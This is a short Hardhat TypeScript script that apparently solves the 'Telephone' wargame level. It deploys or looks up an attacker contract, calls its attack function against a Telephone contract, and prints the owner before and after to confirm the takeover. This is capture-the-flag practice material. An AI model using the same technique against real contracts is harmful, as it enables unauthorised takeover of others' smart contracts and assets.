import { ethers, getNamedAccounts, network } from "hardhat";
import { TelephoneAttacker } from "../typechain-types/TelephoneAttacker";

async function main() {
  let telephone;
  const { deployer } = await getNamedAccounts();
  const chainId = network.config.chainId;

  const isLocalTest = chainId === 31337;

  const telephoneAttacker: TelephoneAttacker = await ethers.getContract(
    "TelephoneAttacker"
  );

  if (isLocalTest) {
    telephone = await ethers.getContract("Telephone");
  } else {
    telephone = await ethers.getContractAt(
      "Telephone",
      "0xB4E98AE39D232cAE47F4f2374E004F0038261585"
    );
  }

  const owner = await telephone.owner();

  console.log(owner);

  const tx = await telephoneAttacker.attack(deployer);
  await tx.wait(isLocalTest ? 1 : 6);

  const newOwner = await telephone.owner();

  console.log(newOwner);
  console.log(newOwner === deployer);
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
